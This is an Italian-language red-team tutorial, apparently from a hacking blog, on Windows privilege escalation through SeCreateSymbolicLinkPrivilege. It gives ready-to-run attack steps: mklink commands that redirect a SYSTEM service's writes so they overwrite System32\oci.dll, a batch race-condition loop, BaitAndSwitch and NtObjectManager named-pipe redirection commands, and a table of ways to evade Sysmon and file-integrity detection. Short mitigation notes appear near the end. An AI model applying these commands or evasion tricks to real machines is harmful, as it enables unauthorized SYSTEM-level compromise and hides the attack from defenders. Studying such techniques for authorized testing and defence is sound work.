---
title: 'SeCreateSymbolicLinkPrivilege: Symlink Attack a Windows da Shell'
slug: secreatesymboliclinkprivilege
description: >-
  Da semplice user a SYSTEM sostituendo file di sistema con un symlink: cosa
  puoi fare con SeCreateSymbolicLinkPrivilege e mklink. Privilege escalation e
  tecnica Red Team.
image: /SeCreateSymbolicLinkPrivilege.webp
draft: false
date: 2026-06-09T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - SeCreateSymbolicLinkPrivilege
  - symlink attack
---

Hai SeCreateSymbolicLinkPrivilege e c'è un servizio SYSTEM che scrive in un path che controlli. Sostituisci quel path con un symlink verso un file di sistema — il servizio SYSTEM sovrascrive il tuo target involontariamente. Nessun tool da caricare, solo `mklink`.

***

## Quick Exploit

```cmd
del C:\temp\output.log
mklink C:\temp\output.log C:\Windows\System32\oci.dll
```

Aspetta che il servizio SYSTEM scriva su `C:\temp\output.log` — sovrascrive `oci.dll` con il tuo contenuto.

***

## Attack Chain

```
SeCreateSymbolicLinkPrivilege Enabled
  → Process Monitor → filtra WriteFile + SYSTEM + path controllato
  → identifica servizio/task che scrive in C:\temp\
  → del C:\temp\output.log
  → mklink C:\temp\output.log C:\Windows\System32\target.dll
  → aspetta prossima scrittura del servizio → DLL/binary sovrascritta
  → sc stop/start NomeServizio → SYSTEM
```

***

## Tool Decision

| Scenario                         | Approccio                                                                         |
| -------------------------------- | --------------------------------------------------------------------------------- |
| Race condition lenta (installer) | `mklink` manuale nella finestra temporale                                         |
| Race condition veloce            | `BaitAndSwitch.exe -target C:\temp\file.txt -dest C:\Windows\System32\oci.dll`    |
| Named pipe redirect              | `NtObjectManager` PowerShell — `New-NtSymbolicLink "\RPC Control\PipeTarget" ...` |

***

## Cos'è SeCreateSymbolicLinkPrivilege

Senza questo privilegio un utente normale può creare solo directory junction (`mklink /J`) ma non symlink a livello di file. Con il privilegio, crei symlink verso qualsiasi target — inclusi file di sistema protetti. Il vettore offensivo dipende da una condizione esterna: un servizio privilegiato che scrive su un path che controlli.

**Nota:** Su Windows 10 1703+ con **Developer Mode** abilitato, chiunque può creare symlink senza il privilegio. Raro sui server, ma vale la pena verificarlo.

***

## Quando esiste

* **Administrators** (token elevato)
* **Sviluppatori** con policy permissive su macchine di sviluppo
* **Componenti WSL, Hyper-V, Docker** — richiedono symlink per operazioni di mount

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeCreateSymbolicLinkPrivilege    Create symbolic links    Enabled
```

Verifica Developer Mode:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock" | Select-Object AllowDevelopmentWithoutDevLicense
```

***

## Tipi di symlink su Windows

|        Tipo       | Comando                   | Privilegio richiesto |
| :---------------: | ------------------------- | -------------------- |
|    File symlink   | `mklink target source`    | ✅ Sì                 |
| Directory symlink | `mklink /D target source` | ✅ Sì                 |
|      Junction     | `mklink /J target source` | ❌ No                 |
|     Hard link     | `mklink /H target source` | ❌ No                 |

Il privilegio sblocca specificamente i file symlink — il vettore offensivo principale.

***

## Step 1 — Identifica un servizio SYSTEM che scrive in path controllati

Usa **Process Monitor** (Sysinternals): apri procmon, applica i filtri `Operation is WriteFile` e `User is SYSTEM`, poi guarda su quali path scrive. Cerca path in cui il tuo account ha permessi di scrittura o che non esistono ancora.

In alternativa, cerca scheduled task che scrivono in path temporanei:

```cmd
schtasks /query /fo LIST /v | findstr /i "SYSTEM\|Task To Run\|Run As User"
```

***

## Step 2 — Piazza il symlink (race condition TOCTOU)

Il servizio esegue tipicamente: controlla se il file esiste → scrive sul file. Nella finestra tra il check e la scrittura, sostituisci il file con un symlink.

Rimuovi il file originale:

```cmd
del C:\temp\output.log
```

Crea il symlink verso il file di sistema target:

```cmd
mklink C:\temp\output.log C:\Windows\System32\oci.dll
```

Il servizio scrive su `C:\temp\output.log` → sovrascrive `oci.dll` con il tuo contenuto.

***

## Step 3 — Automazione della race condition

Per finestre temporali strette, usa uno script che monitora e agisce:

Crea il file `C:\temp\race.bat` con questo contenuto:

```batch
:loop
if exist C:\temp\output.log (
    del C:\temp\output.log
    mklink C:\temp\output.log C:\Windows\System32\oci.dll
    echo [*] Symlink piazzato
    goto done
)
goto loop
:done
```

Esegui:

```cmd
C:\temp\race.bat
```

Per timing più preciso usa **BaitAndSwitch**:

```cmd
BaitAndSwitch.exe -target C:\temp\writable.txt -dest C:\Windows\System32\oci.dll
```

***

## Varianti

### Object namespace symlink — reindirizza named pipe

Con NtObjectManager (James Forshaw) puoi creare symlink nel namespace kernel per reindirizzare named pipe verso una tua pipe — variante dei Potato attack per scenari dove SeImpersonatePrivilege non è disponibile.

Installa il modulo:

```powershell
Install-Module NtObjectManager
Import-Module NtObjectManager
```

Crea la directory nel namespace e il symlink:

```powershell
$dir = New-NtDirectory \RPC Control -Win32Path
New-NtSymbolicLink "\RPC Control\PipeTarget" "\Device\NamedPipe\AttackerPipe" -Directory $dir
```

Poi avvia un listener sulla tua named pipe e aspetta la connessione del processo privilegiato.

Source: [googleprojectzero/sandbox-attacksurface-analysis-tools](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools)

***

## Scenari reali

**Installer software con privilegi** — molti MSI estraggono file in `C:\temp\` come SYSTEM prima di copiarli nella destinazione finale. Se riesci a piazzare un symlink nella finestra giusta, l'installer copia la tua DLL/binary nel path finale con permessi elevati.

**Scheduled task che scrive log** — una task schedulata come SYSTEM scrive log in `C:\temp\tasklog.txt`. Symlink verso un file DLL cercato da un servizio → overwrite alla prossima esecuzione della task.

***

## Errori comuni

**Il servizio usa `FILE_FLAG_OPEN_REPARSE_POINT`** — Apre il symlink stesso, non il target. In Process Monitor vedi `REPARSE` nel campo Result invece del path risolto. Quel servizio non segue symlink — cerca un altro target.

**Race condition troppo stretta per il timing manuale** — Usa BaitAndSwitch per automatizzare: `BaitAndSwitch.exe -target C:\temp\file.txt -dest C:\Windows\System32\oci.dll`.

**Nessun servizio SYSTEM scrive su path controllati** — Il vettore non è praticabile in quell'ambiente. Verifica prima con Process Monitor: filtra `Operation=WriteFile`, `User=SYSTEM`, `Path contains C:\temp` o altri path scrivibili.

**Developer Mode non disponibile, privilegio assente** — Su server il Developer Mode non è quasi mai abilitato. Verifica con `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock" | Select-Object AllowDevelopmentWithoutDevLicense`.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                                                    | Come lo bypassa il Red Team                                                   |
| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| Sysmon 23 (FileDelete) + 11 (FileCreate) sullo stesso path — pattern TOCTOU | Usa un path diverso per ogni tentativo o aumenta il delay tra delete e mklink |
| Creazione symlink verso System32                                            | Punta a path meno monitorati — DLL in directory di servizi invece di System32 |
| FIM su directory di output temporaneo                                       | Usa path di staging meno comuni: `C:\Users\Public\`, `C:\ProgramData\Temp\`   |

***

## Quando fallisce

* Il servizio usa `FILE_FLAG_OPEN_REPARSE_POINT` → non segue symlink
* Nessun servizio SYSTEM scrive su path controllati → vettore non praticabile
* Race condition impossibile da vincere → BaitAndSwitch fallisce anche automatizzato

***

## Mitigazioni

* I servizi SYSTEM non dovrebbero scrivere in path accessibili a utenti non privilegiati
* Usare `FILE_FLAG_OPEN_REPARSE_POINT` nei servizi per non seguire symlink automaticamente
* Developer Mode abilitato solo dove strettamente necessario

**Nota realistica:** Questo è il vettore più condizionale della serie — richiede una combinazione specifica di privilegio + servizio vulnerabile. Nella pratica, si usa quando tutti gli altri vettori sono bloccati.

***

## FAQ

**È il vettore più complesso della serie?**
Sì — richiede condizione esterna + race condition. Usalo come ultima opzione quando SeRestorePrivilege, SeBackupPrivilege e gli altri non sono disponibili.

**Developer Mode è comune sui server?**
No — funzionalità workstation. Su server è raro, ma verifica sempre con il comando sopra.

***

SeCreateSymbolicLinkPrivilege è un vettore condizionale: inutile da solo, potente quando c'è un servizio SYSTEM che scrive su path che controlli.

***

**Articoli correlati:**

* [SeRestorePrivilege](https://hackita.it/articoli/serestoreprivilege) — scrittura bypass ACL diretta, senza condizioni esterne
* [SeImpersonatePrivilege](https://hackita.it/articoli/seimpersonateprivilege) — token interception via named pipe

**Riferimenti:** [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-symbolic-links)
